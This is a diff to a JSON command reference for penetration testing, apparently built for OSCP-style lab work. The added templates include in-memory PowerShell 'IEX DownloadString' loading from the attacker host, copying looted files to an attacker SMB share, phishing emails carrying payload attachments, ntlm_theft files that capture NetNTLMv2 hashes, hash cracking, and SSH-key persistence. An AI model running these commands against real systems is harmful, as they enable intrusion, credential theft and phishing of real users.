@@ -52,7 +52,9 @@
         {"purpose": "Log in with a recovered private key (key must be 0600)", "template": "chmod 600 <key>; ssh -i <key> <user>@{{TARGET}}", "intent": "authenticate"},
         {"purpose": "Local forward: reach an internal port from Kali", "template": "ssh -L <port>:127.0.0.1:<port> <user>@{{TARGET}}", "intent": "pivot"},
         {"purpose": "Remote forward: push a Kali port to the target's side", "template": "ssh -R <port>:127.0.0.1:<port> <user>@{{TARGET}}", "intent": "pivot"},
-        {"purpose": "Dynamic SOCKS proxy for proxychains", "template": "ssh -D 1080 <user>@{{TARGET}}", "intent": "pivot"}
+        {"purpose": "Dynamic SOCKS proxy for proxychains", "template": "ssh -D 1080 <user>@{{TARGET}}", "intent": "pivot"},
+        { "purpose": "From the target: reverse dynamic SOCKS on Kali port 1080 (OpenSSH 7.6+)", "template": "ssh -R 1080 <user>@{{LHOST}}", "intent": "pivot" },
+        { "purpose": "Jump through one SSH host to reach the next", "template": "ssh -J <user>@<host> <user>@<target>", "intent": "pivot" }
       ]
     },
     { "name": "evil-winrm", "description": "Interactive Windows shell over WinRM.", "commands": [
@@ -80,8 +82,12 @@
       "description": "GPU password cracker.",
       "commands": [
         {"purpose": "Confirm a mode number by its example hash", "template": "hashcat --example-hashes | grep -iA2 <keyword>", "intent": "enumerate"},
+        {"purpose": "MD5", "template": "hashcat -m 0 <hashfile> /usr/share/wordlists/rockyou.txt", "intent": "tune"},
         {"purpose": "Crack NTLM (mode 1000)", "template": "hashcat -m 1000 <hashfile> /usr/share/wordlists/rockyou.txt", "intent": "exploit"},
         {"purpose": "Crack NetNTLMv2 captures (mode 5600)", "template": "hashcat -m 5600 <hashfile> /usr/share/wordlists/rockyou.txt", "intent": "exploit"},
+        {"purpose": "md5crypt ($1$, old Linux shadow and Cisco)", "template": "hashcat -m 500 <hashfile> /usr/share/wordlists/rockyou.txt", "intent": "tune"},
+        {"purpose": "bcrypt ($2y$, web app databases); slow, use a short list", "template": "hashcat -m 3200 <hashfile> /usr/share/wordlists/rockyou.txt", "intent": "tune"},
+        {"purpose": "Domain cached credentials (DCC2, from secretsdump)", "template": "hashcat -m 2100 <hashfile> /usr/share/wordlists/rockyou.txt", "intent": "tune"},
         {"purpose": "Crack any mode with a rules file", "template": "hashcat -m <mode> -a 0 <hashfile> /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule", "intent": "exploit"},
         {"purpose": "Show already-cracked results", "template": "hashcat -m <mode> <hashfile> --show", "intent": "enumerate"}
       ]
@@ -170,7 +176,8 @@
       "description": "Windows download via Invoke-WebRequest or WebClient.",
       "commands": [
         {"purpose": "Download with Invoke-WebRequest (iwr)", "template": "powershell -c \"iwr http://{{LHOST}}:<port>/<file> -OutFile <file>\"", "intent": "transfer"},
-        {"purpose": "Download with Net.WebClient (older hosts)", "template": "powershell -c \"(New-Object Net.WebClient).DownloadFile('http://{{LHOST}}:<port>/<file>','<file>')\"", "intent": "transfer"}
+        {"purpose": "Download with Net.WebClient (older hosts)", "template": "powershell -c \"(New-Object Net.WebClient).DownloadFile('http://{{LHOST}}:<port>/<file>','<file>')\"", "intent": "transfer"},
+        { "purpose": "Load a script into memory without writing it to disk (PowerView, PowerUp)", "template": "powershell -ep bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://{{LHOST}}/<file>.ps1')\"", "intent": "transfer" }
       ]
     },
     {
@@ -196,6 +203,7 @@
         {"purpose": "Start the proxy on Kali with a self-signed cert", "template": "ligolo-proxy -selfcert", "intent": "pivot"},
         {"purpose": "Run the agent on the compromised host (connects back)", "template": "./agent -connect {{LHOST}}:11601 -ignore-cert", "intent": "pivot"},
         {"purpose": "In the proxy console: pick the agent session", "template": "session", "intent": "pivot"},
+        {"purpose": "In the proxy: start the tunnel for the selected session", "template": "start", "intent": "pivot"},
         {"purpose": "On Kali: route the internal subnet through the tunnel, then type start in the console", "template": "sudo ip route add <subnet> dev ligolo", "intent": "pivot"},
         {"purpose": "Relay an internal port back to Kali for a reverse shell", "template": "listener_add --addr 0.0.0.0:<port> --to 127.0.0.1:<port>", "intent": "pivot"}
       ]
@@ -223,7 +231,17 @@
       "commands": [
         {"purpose": "Route an internal subnet through an SSH host", "template": "sshuttle -r <user>@{{TARGET}} <subnet>", "intent": "pivot"}
       ]
-    }
+    },
+    { "name": "swaks", "description": "Sends test emails from the command line, with attachments and SMTP auth.", "commands": [
+      { "purpose": "Send the attachment through an open relay", "template": "swaks -t <user>@<domain> --from <user>@<domain> --attach @<file> --server {{TARGET}} --body 'Please review the attached file.' --header 'Subject: Review' --suppress-data", "intent": "enumerate" },
+      { "purpose": "Send it as a user whose mail login you have", "template": "swaks -t <user>@<domain> --from <user>@<domain> --attach @<file> --server {{TARGET}} --body 'Please review the attached file.' --header 'Subject: Review' --suppress-data --auth LOGIN --auth-user '<user>@<domain>' --auth-password '<pass>'", "intent": "enumerate" }
+    ]},
+    { "name": "wsgidav", "description": "WebDAV server on Kali: hosts the payload a shortcut or library file points to.", "commands": [
+      { "purpose": "Serve ./webdav over WebDAV on port 80", "template": "wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root ./webdav/", "intent": "transfer" }
+    ]},
+    { "name": "ntlm_theft", "description": "Builds files (lnk, url, scf, library-ms, docx…) that make Windows authenticate to you when opened or browsed.", "commands": [
+      { "purpose": "Make every file type pointing at Kali in ./slg", "template": "python3 ntlm_theft.py -g all -s {{LHOST}} -f slg", "intent": "enumerate" }
+    ]}
   ],
   "techniques": [
     { "name": "Exploit a known vulnerability", "phase": "Initial Access", "service": "any", "applies": "any", "needs": ["version"], "yields": ["shell"], "when": "A service version matches a known CVE: read and run the Exploit-DB proof of concept, or use the matching Metasploit module.", "tools": ["searchsploit","msfconsole"], "commands": [
@@ -241,6 +259,23 @@
       "tools": ["msfvenom"],
       "commands": [
         {"purpose": "Pick the exact payload, format and matching listener on the app's Reverse shells page, then generate it", "template": "msfvenom -p <payload> LHOST={{LHOST}} LPORT={{LPORT}} -f <format> -o <file>", "intent": "exploit"}
+      ]
+    },
+    {
+      "name": "Phish a user with an email attachment",
+      "phase": "Initial Access", "service": "smtp", "applies": "windows",
+      "needs": ["creds"], "yields": ["shell"],
+      "when": "The scenario has a mail server and a user who opens attachments (PEN-200 client-side): mail a shortcut or library file that runs your payload.",
+      "tools": ["swaks", "wsgidav"]
+    },
+    {
+      "name": "Capture hashes with files dropped on a writable share",
+      "phase": "Initial Access", "service": "smb", "applies": "windows",
+      "needs": [], "yields": ["hash"],
+      "when": "You can write to a share that people browse: a dropped shortcut makes their machine send you a NetNTLMv2 hash.",
+      "tools": ["ntlm_theft", "smbclient", "Responder", "hashcat"],
+      "commands": [
+        { "purpose": "Drop the files on the share, then wait in Responder", "template": "smbclient //{{TARGET}}/<share> -U '<user>%<pass>' -c 'prompt OFF; lcd slg; mput *'", "intent": "transfer" }
       ]
     },
     { "name": "Spray found credentials at the open services", "phase": "Initial Access", "service": "any", "applies": "any", "needs": ["creds"], "yields": ["shell"], "when": "You recovered a user and password and want every service on this box and the rest of the subnet it unlocks; check the lockout policy first.", "tools": ["nxc"], "commands": [
@@ -382,8 +417,10 @@
       "needs": ["shell"],
       "yields": [],
       "when": "You found a key, config or DB dump on the box and need it on Kali to crack or read.",
-      "tools": ["nc", "curl", "smbclient"],
-      "commands": []
+      "tools": ["nc", "curl", "smbclient", "impacket-smbserver"],
+      "commands": [
+        { "purpose": "Windows: copy to your impacket-smbserver share", "template": "copy <file> \\\\{{LHOST}}\\share\\", "intent": "transfer" }
+      ]
     },
     { "name": "Route an internal subnet through a pivot", "phase": "Lateral Movement", "service": "shell", "applies": "any", "needs": ["shell"], "when": "You have a shell on a dual-homed host and want transparent access to its hidden subnet.", "yields": [], "tools": ["ligolo-ng"], "commands": [
       { "purpose": "Full flow: create the tun once, start the proxy, run the agent on the host, pick the session, add the route, then type start", "template": "sudo ip route add <subnet> dev ligolo", "intent": "pivot" }
@@ -431,10 +468,12 @@
       "when": "You have a shell and need user.txt, root.txt or proof.txt with context for the writeup.",
       "tools": [],
       "commands": [
-        {"purpose": "Locate the flag files (Linux)", "template": "find / -name user.txt -o -name root.txt 2>/dev/null", "intent": "enumerate"},
-        {"purpose": "Locate the flag files (Windows)", "template": "where /r C:\\Users user.txt proof.txt root.txt", "intent": "enumerate"},
+        {"purpose": "Locate the flag files (Linux)", "template": "find / \\( -name user.txt -o -name root.txt -o -name local.txt -o -name proof.txt -o -name 'flag*.txt' \\) 2>/dev/null", "intent": "enumerate"},
+        {"purpose": "Locate the flag files (Windows)", "template": "where /r C:\\Users user.txt root.txt local.txt proof.txt", "intent": "enumerate"},
         {"purpose": "Prove it with who and where you are (Linux)", "template": "id; hostname; ip -4 a | grep inet; cat /root/root.txt", "intent": "enumerate"},
-        {"purpose": "Prove it (Windows)", "template": "whoami & hostname & ipconfig & type C:\\Users\\Administrator\\Desktop\\root.txt", "intent": "enumerate"}
+        {"purpose": "Prove it (Windows)", "template": "whoami & hostname & ipconfig & type C:\\Users\\Administrator\\Desktop\\root.txt", "intent": "enumerate"},
+        { "purpose": "OSCP proof (Linux): flag, user and IP in one interactive-shell screenshot", "template": "cat /root/proof.txt; id; hostname; ip -4 a", "intent": "enumerate" },
+        { "purpose": "OSCP proof (Windows): flag, user and IP in one interactive-shell screenshot", "template": "type C:\\Users\\Administrator\\Desktop\\proof.txt & whoami & hostname & ipconfig", "intent": "enumerate" }
       ]
     },
     {
@@ -461,6 +500,7 @@
       "when": "Lab re-entry: you control a user's home and want a key login that survives a password change.",
       "tools": [],
       "commands": [
+        {"purpose": "On Kali: make a key pair; slg.pub is <your-pubkey>, log in with ssh -i slg", "template": "ssh-keygen -t ed25519 -f slg -N ''", "intent": "transfer"},
         {"purpose": "Append your public key to the account", "template": "mkdir -p ~/.ssh; echo '<your-pubkey>' >> ~/.ssh/authorized_keys; chmod 600 ~/.ssh/authorized_keys", "intent": "exploit"}
       ]
     },
